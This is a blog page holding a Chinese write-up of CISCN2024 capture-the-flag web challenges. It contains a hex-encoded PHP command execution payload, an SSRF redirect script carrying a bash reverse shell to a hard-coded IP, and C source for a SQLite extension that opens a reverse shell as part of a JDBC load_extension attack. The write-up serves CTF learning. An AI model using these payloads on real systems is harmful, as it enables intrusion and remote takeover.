@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言主要复现一下ezjava，jdbc attack还是很有意思的 simple_php用php -r 执行php代码，用hex2bin绕过关键字和转义。 1cmd&#x3D;php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2024 writeup（web部分）">
+<meta property="og:url" content="https://jaspersec.top/posts/3286688009.html">
+<meta property="og:site_name" content="Jasper_sec">
+<meta property="og:description" content="前言主要复现一下ezjava，jdbc attack还是很有意思的 simple_php用php -r 执行php代码，用hex2bin绕过关键字和转义。 1cmd&#x3D;php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250441957.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442616.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430802.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442181.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250443151.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430804.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250435029.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250436448.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430805.png">
+<meta property="article:published_time" content="2024-05-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-31T22:09:47.235Z">
+<meta property="article:author" content="Jasper_sec">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="jdbc attack">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250441957.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CISCN2024 writeup（web部分）</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Jasper_sec" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span> 
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/3347678648.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/3519640587.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/posts/3286688009.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/posts/3286688009.html&text=CISCN2024 writeup（web部分）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/posts/3286688009.html&title=CISCN2024 writeup（web部分）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/posts/3286688009.html&is_video=false&description=CISCN2024 writeup（web部分）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CISCN2024 writeup（web部分）&body=Check out this article: https://jaspersec.top/posts/3286688009.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/posts/3286688009.html&title=CISCN2024 writeup（web部分）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/posts/3286688009.html&title=CISCN2024 writeup（web部分）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/posts/3286688009.html&title=CISCN2024 writeup（web部分）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/posts/3286688009.html&title=CISCN2024 writeup（web部分）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/posts/3286688009.html&name=CISCN2024 writeup（web部分）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/posts/3286688009.html&t=CISCN2024 writeup（web部分）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <!-- 
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-php"><span class="toc-number">2.</span> <span class="toc-text">simple_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms"><span class="toc-number">3.</span> <span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">4.</span> <span class="toc-text">easycms_revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjava"><span class="toc-number">5.</span> <span class="toc-text">ezjava</span></a></li></ol>
+      </div>
+     -->
+    <div id="toc">
+      <div id="toc-div" class="toc-article" >
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-php"><span class="toc-number">2.</span> <span class="toc-text">simple_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms"><span class="toc-number">3.</span> <span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">4.</span> <span class="toc-text">easycms_revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjava"><span class="toc-number">5.</span> <span class="toc-text">ezjava</span></a></li></ol>
+        
+      </div>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CISCN2024 writeup（web部分）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Jasper_sec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-24T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-05-25</time>
+        
+        (Updated: <time datetime="2025-03-31T22:09:47.235Z" class="dt-updated" itemprop="dateModified">2025-04-01</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/jdbc-attack/" rel="tag">jdbc attack</a>, <a class="p-category" href="/tags/php/" rel="tag">php</a>, <a class="p-category" href="/tags/wp/" rel="tag">wp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要复现一下ezjava，jdbc attack还是很有意思的</p>
+<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>用php -r 执行php代码，用hex2bin绕过关键字和转义。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250441957.png" alt="image-20240525044153901"></p>
+<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>生成二维码的接口可以打ssrf，打302跳转进ssrf，参考下面的链接：<br><a target="_blank" rel="noopener" href="https://zone.huoxian.cn/d/392-302-ssrfhttp">利用302跳转绕过限制-ssrf仅能使用http协议时 - 火线 Zone-安全攻防社区 (huoxian.cn)</a></p>
+<p>vps上用php -S 0.0.0.0:8080 起一个http服务，写上跳转脚本，利用题目自带的后门反弹shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://127.0.0.1/flag.php?cmd=%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%31%36%2e%36%32%2e%33%38%2e%37%31%2f%39%39%39%39%20%30%3e%26%31%22&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);  </span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+
+<p>利用接口访问vps，利用302跳转反弹shell拿到flag</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zecvr9tqvox55jeytq8.cloudeci1.ichunqiu.com/?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://xx.xx.xx.xx/index.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442616.png" alt="image-20240525044216568"></p>
+<h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>getimagesize 那里对$thumb的文件类型有要求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430802.png" alt="Pasted image 20240522084222.png" title="wikilink"></p>
+<p>我们加一个图片头绕过一下就好了，这里有点坑，要多加几个<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442181.png" alt="image-20240525044243126"></p>
+<p>payload区别不大，注意这里text不能重复，不然不会进代码逻辑</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=api&amp;c=api&amp;m=qrcode&amp;text=7777777777777&amp;thumb=http://xx.xx.xx.xx/index.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250443151.png" alt="image-20240525044331116"></p>
+<p>PS：上面的方法在比赛可以过，但是在ctfshow的靶场上是过不了的，复现的师傅注意一下。</p>
+<h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>这题有好几种解法，有db文件缓存、sql注入和AspectJWeaver反序列化写文件，下面用的缓存</p>
+<p>简单说一下整体思路：</p>
+<ol>
+<li>让client访问vps上的rce.so，利用缓存在client的&#x2F;tmp下写文件（文件名可计算）</li>
+<li>再让client访问恶意数据库，触发jdbc attack执行load_extension，加载上面写入的文件实现rce</li>
+</ol>
+<p>首先是JdbcController可以传任意的jdbc bean，即sql配置参数可控</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JdbcController  </span></span><br><span class="line"><span class="keyword">public</span> ResultBean <span class="title function_">connect</span><span class="params">(<span class="meta">@RequestBody</span> JdbcBean jdbcBean)</span> &#123;    </span><br><span class="line">    <span class="keyword">try</span> &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(Integer.valueOf(<span class="number">1</span>), String.join((CharSequence)<span class="string">&quot;,&quot;</span>, <span class="built_in">this</span>.datasourceServiceImpl.testDatasourceConnectionAble(jdbcBean)));    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">catch</span> (Exception e) &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(Integer.valueOf(<span class="number">0</span>), <span class="string">&quot;\u8fde\u63a5\u5931\u8d25&quot;</span>);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其次，在service层会有switch分支，通过传入的type值决定使用不同Driver去链接数据库</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DatasourceServiceImpl  </span></span><br><span class="line"><span class="keyword">switch</span> (jdbcBean.getType()) &#123;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: &#123;    </span><br><span class="line">        Class.forName((String)config.get(<span class="string">&quot;JDBC-MYSQL&quot;</span>));    </span><br><span class="line">        <span class="type">MysqlDatasourceConnector</span> <span class="variable">mysqlDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MysqlDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));    </span><br><span class="line">        <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;    </span><br><span class="line">            <span class="keyword">return</span> mysqlDatasourceConnector.getTableContent(jdbcBean.getTableName());    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> mysqlDatasourceConnector.getTables();    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: &#123;    </span><br><span class="line">        Class.forName((String)config.get(<span class="string">&quot;JDBC-POSTGRES&quot;</span>));    </span><br><span class="line">        <span class="type">PostgresDatasourceConnector</span> <span class="variable">postgresDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PostgresDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));    </span><br><span class="line">        <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;    </span><br><span class="line">            <span class="keyword">return</span> postgresDatasourceConnector.getTableContent(jdbcBean.getTableName());    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> postgresDatasourceConnector.getTables();    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: &#123;    </span><br><span class="line">        <span class="type">SqliteDatasourceConnector</span> <span class="variable">sqliteDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqliteDatasourceConnector</span>(jdbcBean.getUrl());    </span><br><span class="line">        <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;    </span><br><span class="line">            <span class="keyword">return</span> sqliteDatasourceConnector.getTableContent(jdbcBean.getTableName());    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> sqliteDatasourceConnector.getTables();    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: &#123;    </span><br><span class="line">        Class.forName((String)config.get(<span class="string">&quot;JDBC-SQLITE&quot;</span>));    </span><br><span class="line">        <span class="keyword">break</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">default</span>: &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里漏洞点比较明显，在utils的sqlite工具类里，可以发现开了load_extension，说明可以打sqlite jdbc attack，sqlite jdbc attack不像其他可以直接反序列化结合组件rce，sqlite只能执行sql语句。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SqliteDatasourceConnector  </span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">SqliteDatasourceConnector</span><span class="params">(String url)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;    </span><br><span class="line">    Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);    </span><br><span class="line">    <span class="type">SQLiteConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SQLiteConfig</span>();    </span><br><span class="line">    config.enableLoadExtension(<span class="literal">true</span>);    </span><br><span class="line">    <span class="built_in">this</span>.connection = DriverManager.getConnection(url, config.toProperties());    </span><br><span class="line">    <span class="built_in">this</span>.connection.setAutoCommit(<span class="literal">true</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里和mysql的udf提权很像，在可以执行sql命令之后，考虑通过加载.so文件来实现rce</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 编译命令，注意要在linux环境下编译  </span><br><span class="line">gcc -g -fPIC -shared rce.c -o rce.so</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rce.c 反弹shell用的  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>    </span></span><br><span class="line">    </span><br><span class="line">SQLITE_EXTENSION_INIT1    </span><br><span class="line">    </span><br><span class="line"><span class="comment">/* Configuration for the TCP connection */</span>    </span><br><span class="line"><span class="type">int</span> tcp_port = <span class="number">2333</span>;    </span><br><span class="line"><span class="type">char</span> *ip = <span class="string">&quot;116.62.38.71&quot;</span>;    </span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN32    </span></span><br><span class="line">__declspec(dllexport)    </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>    </span></span><br><span class="line"><span class="comment">/**    </span></span><br><span class="line"><span class="comment"> * Initializes the SQLite extension. * * @param db SQLite database pointer * @param pzErrMsg Error message pointer * @param pApi SQLite API routines pointer * @return SQLITE_OK on success */</span><span class="type">int</span> <span class="title function_">sqlite3_extension_init</span><span class="params">(    </span></span><br><span class="line"><span class="params">    sqlite3 *db,    </span></span><br><span class="line"><span class="params">    <span class="type">char</span> **pzErrMsg,    </span></span><br><span class="line"><span class="params">    <span class="type">const</span> sqlite3_api_routines *pApi    </span></span><br><span class="line"><span class="params">)</span> &#123;    </span><br><span class="line">    <span class="type">int</span> rc = SQLITE_OK;    </span><br><span class="line">    SQLITE_EXTENSION_INIT2(pApi);    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Establish a TCP connection and spawn a shell if running in a child process */</span>    </span><br><span class="line">    <span class="type">int</span> fd;    </span><br><span class="line">    <span class="keyword">if</span> ((fork()) &lt;= <span class="number">0</span>) &#123;    </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span>    </span><br><span class="line">        addr.sin_family = AF_INET;    </span><br><span class="line">        addr.sin_port = htons(tcp_port);    </span><br><span class="line">        addr.sin_addr.s_addr = inet_addr(ip);    </span><br><span class="line">    </span><br><span class="line">        fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);    </span><br><span class="line">        <span class="keyword">if</span> (connect(fd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) != <span class="number">0</span>) &#123;    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// Exit if connection fails    </span></span><br><span class="line">        &#125;    </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Redirect standard file descriptors to the socket    </span></span><br><span class="line">        dup2(fd, <span class="number">0</span>);    </span><br><span class="line">        dup2(fd, <span class="number">1</span>);    </span><br><span class="line">        dup2(fd, <span class="number">2</span>);    </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Execute bash shell    </span></span><br><span class="line">        execve(<span class="string">&quot;/bin/bash&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> rc;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>sqlite jdbc attack运行SQL命令，需要连接到构造好的数据库，构造方法如下：</p>
+<p>使用navicat新建一个exp.db，然后创建一个视图，下面选中部分即为client连接之后执行的sql语句<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430804.png" alt="Pasted image 20240525035351.png" title="wikilink"></p>
+<p>缓存实际上就是对当前sqlite连接的数据库在&#x2F;tmp&#x2F;做一个备份，虽然第一次访问的是rce.so，但是程序仍会保存为.db文件，通过CoreConnection类可以知道缓存命名规则，文件名生成脚本如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exp;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> java.net.URL;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cacheFilenameGen</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;    </span><br><span class="line">        Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);    </span><br><span class="line">        <span class="type">String</span> <span class="variable">writeUrl</span> <span class="operator">=</span> <span class="string">&quot;http://xxx/rce.so&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">triggerUrl</span> <span class="operator">=</span> <span class="string">&quot;http://xxx/exp.db&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">tmpDirRemote</span> <span class="operator">=</span> <span class="string">&quot;/tmp/sqlite-jdbc-tmp-&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">tmpDirLocal</span> <span class="operator">=</span> <span class="string">&quot;/var/folders/x8/mrcrl0p503nbmvy62sgmtk3m0000gn/T/sqlite-jdbc-tmp-&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">soFilePlace</span> <span class="operator">=</span> String.format(<span class="string">&quot;sqlite-jdbc-tmp-%d.db&quot;</span>, <span class="keyword">new</span> <span class="title class_">URL</span>(writeUrl).hashCode());    </span><br><span class="line">        System.out.println(soFilePlace);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将 rce.so 和 exp.db 放到vps上，依次连接，执行写入缓存、触发SQL语句操作即可。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250435029.png" alt="image-20240525043551966"></p>
